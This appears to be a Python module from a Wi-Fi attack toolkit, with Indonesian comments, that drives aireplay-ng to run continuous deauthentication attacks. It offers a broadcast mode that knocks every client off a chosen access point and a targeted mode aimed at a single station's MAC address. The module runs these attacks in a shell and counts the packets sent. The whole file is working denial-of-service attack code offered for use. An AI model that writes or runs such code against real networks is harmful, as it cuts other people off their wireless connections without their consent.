import os
import sys
import time
import subprocess
import csv

class DeauthAttack:
    def __init__(self, manager, colors):
        """
        Inisialisasi modul attack.
        :param manager: Referensi ke WirelessManager
        :param colors: Referensi ke objek colors global
        """
        self.manager = manager
        self.colors = colors

    def ui_dos_menu(self, targets):
        """WiFi Pro - Deauthentication Module"""
        c = self.colors # Shortcut untuk warna
        if not targets:
            print(f"\n{c.ERR} {c.R}Target list is empty. Scan first (01).{c.NC}")
            return

        try:
            print(f"\n{c.Q} Select Target ID (1-{len(targets)}):")
            val = input(f"  {c.DG}Selection > {c.NC}").strip()
            if not val: return
            
            target = targets[int(val) - 1]
            ctx = {
                'bssid': target.get('bssid'),
                'ch': target.get('ch'),
                'essid': target.get('essid', 'Unknown'),
                'iface': self.manager.iface # Mengambil iface dari manager
            }
        except (ValueError, IndexError):
            print(f"{c.ERR} Invalid Target ID.")
            return

        while True:
            self._print_dos_header(ctx['essid'], ctx['bssid'])
            choice = input(f"  {c.DG}Attack Mode > {c.NC}").strip()

            if choice in ['1', '01']:
                # Menambahkan stdbuf agar output mengalir ke bar proses
                cmd = f"stdbuf -oL iw dev {ctx['iface']} set channel {ctx['ch']} && stdbuf -oL aireplay-ng -0 0 -a {ctx['bssid']} --ignore-negative-one {ctx['iface']}"
                self._execute_attack(ctx['essid'], cmd)
                break

            elif choice in ['2', '02']:
                self._handle_client_deauth(ctx)
                break

            elif choice in ['0', '00']:
                break

    def _print_dos_header(self, essid, bssid):
        """Professional Header for Sub-menus"""
        c = self.colors
        print(f"\n  {c.BOLD}{c.W}MODULE:{c.NC} {c.C}DEAUTH_ATTACK{c.NC}")
        print(f"  {c.BOLD}{c.W}TARGET:{c.NC} {c.Y}{essid}{c.NC} {c.DG}({bssid}){c.NC}")
        print(f"  {c.DG}" + "─"*45 + f"{c.NC}")
        print(f"  [{c.C}01{c.NC}] Broadcast Attack (All Clients)")
        print(f"  [{c.C}02{c.NC}] Targeted Attack  (Select Client)")
        print(f"  [{c.C}00{c.NC}] Return to Dashboard")
        print(f"  {c.DG}" + "─"*45 + f"{c.NC}")

    def _handle_client_deauth(self, ctx):
        """WiFi Pro - Selective Deauth dengan Auto-Target Logic"""
        c = self.colors
        print(f"\n{c.INFO} {c.W}Scanning for active stations on channel {ctx['ch']}...")
        print(f"  {c.DG}Please wait, collecting data... [12s]{c.NC}")
        
        # Mengambil data client dari manager/scanner
        clients = self.manager._scan_clients(ctx['iface'], ctx['bssid'], ctx['ch'])

        if not clients:
            print(f"{c.WARN} {c.R}No active stations found on this AP.{c.NC}")
            time.sleep(1.5)
            return

        if len(clients) == 1:
            sel_client = clients[0]
            print(f"  {c.OK} Only one client detected: {c.G}{sel_client}{c.NC}")
            print(f"  {c.INFO} {c.W}Auto-selecting station for engagement...{c.NC}")
            time.sleep(1)
            cmd = f"stdbuf -oL aireplay-ng -0 0 -a {ctx['bssid']} -c {sel_client} -D --ignore-negative-one {ctx['iface']}"
            self._execute_attack(f"{ctx['essid']} > {sel_client}", cmd, is_specific=True)
            return

        print(f"\n  {c.BOLD}{c.W}ID   STATION MAC         STATUS{c.NC}")
        print(f"  {c.DG}" + "─"*45 + f"{c.NC}")
        for i, mac in enumerate(clients, 1):
            print(f"  {c.C}{str(i).zfill(2)}{c.NC}   {c.W}{mac}{c.NC}   {c.G}Targetable{c.NC}")
        
        try:
            c_val = input(f"\n  {c.Q} Select Client ID (1-{len(clients)}): ").strip()
            if not c_val: return
            sel_client = clients[int(c_val) - 1]
            cmd = f"stdbuf -oL aireplay-ng -0 0 -a {ctx['bssid']} -c {sel_client} -D --ignore-negative-one {ctx['iface']}"
            self._execute_attack(f"{ctx['essid']} > {sel_client}", cmd, is_specific=True)
        except (ValueError, IndexError):
            print(f"{c.ERR} Invalid Client Selection.")
            time.sleep(1)

    def _execute_attack(self, target_label, cmd, is_specific=False):
        """WiFi Pro - Adaptive Response Module (Fixed Exit Logic)"""
        import subprocess, sys, time
        c = self.colors
        
        print(f"\n{c.INFO} {c.G}Initializing Attack: {c.W}{target_label}{c.NC}")
        print(f"{c.INFO} {c.R}Press CTRL+C to Stop{c.NC}")
        print(f"  {c.DG}─────────────────────────────────────────────{c.NC}")

        process = subprocess.Popen(
            cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, 
            universal_newlines=True, bufsize=1
        )

        sent_packets = 0
        start_time = time.time()
        last_packet_time = time.time()
        timeout_threshold = 5.0
        max_duration = 20.0
        interrupted = False  # Flag untuk menandai jika dihentikan manual

        try:
            while True:
                line = process.stdout.readline()
                current_time = time.time()
                
                if line and any(x in line for x in ["Sending", "DeAuth", "ACK"]):
                    sent_packets += 1
                    last_packet_time = current_time 
                
                idle_time = current_time - last_packet_time
                bar_idx = int((current_time * 8) % 20)
                bar = "░" * bar_idx + "█" + "░" * (19 - bar_idx)
                
                if is_specific and idle_time > timeout_threshold:
                    remaining = max_duration - (current_time - start_time)
                    if remaining <= 0: 
                        print(f"\n{c.ERR} {c.R}Target Lost: No response after retries.{c.NC}")
                        break
                    status = f"\r  {c.WARN} {c.Y}RETRYING: {c.NC}[{bar}] {c.W}Signal Weak.. {c.R}{remaining:.1f}s{c.NC} "
                else:
                    status = (
                        f"\r  {c.OK} {c.W}Attack: {c.G}[{bar}]{c.NC} "
                        f"{c.W}Sent: {c.Y}{sent_packets:04d}{c.NC} "
                        f"{c.DG}({int(current_time - start_time)}s){c.NC}"
                    )

                sys.stdout.write(status)
                sys.stdout.flush()

                if process.poll() is not None: break
                if not line: time.sleep(0.01)

        except KeyboardInterrupt:
            interrupted = True # Tandai bahwa user menekan CTRL+C

        # --- FINALISASI (Di luar blok try-except agar selalu dieksekusi) ---
        process.terminate()
        
        # Bersihkan baris status terakhir agar tampilan bersih
        sys.stdout.write("\r" + " " * 85 + "\r")
        sys.stdout.flush()

        if interrupted:
            print(f"{c.WARN} {c.R}Attack Interrupted Manually by User.{c.NC}")
        
        # Cetak laporan akhir
        print(f"{c.OK} {c.G}Sequence Finished. Total Packets Sent: {c.W}{sent_packets}{c.NC}")
        
        # Tunggu instruksi enter agar tidak langsung 'loncat' ke menu
        input(f"  {c.DG}Press {c.W}[Enter]{c.DG} to return to menu...{c.NC}")
